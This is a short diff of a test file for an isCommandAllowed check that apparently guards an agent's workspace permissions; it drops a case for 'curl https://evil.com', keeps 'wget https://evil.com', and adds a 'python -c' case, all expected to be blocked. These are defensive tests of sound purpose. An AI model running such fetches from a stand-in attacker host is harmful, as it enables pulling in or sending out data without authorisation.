@@ -136,8 +136,8 @@ describe('isCommandAllowed', () => {
   });
 
   it('拒绝未列入白名单的任意命令', () => {
-    expect(isCommandAllowed('curl https://evil.com', DEFAULT_WORKSPACE_PERMISSIONS)).toBe(false);
     expect(isCommandAllowed('wget https://evil.com', DEFAULT_WORKSPACE_PERMISSIONS)).toBe(false);
+    expect(isCommandAllowed('python -c "print(1)"', DEFAULT_WORKSPACE_PERMISSIONS)).toBe(false);
   });
 
   it('拒绝 npm/npx，避免绕过专用文件工具修改工作区', () => {
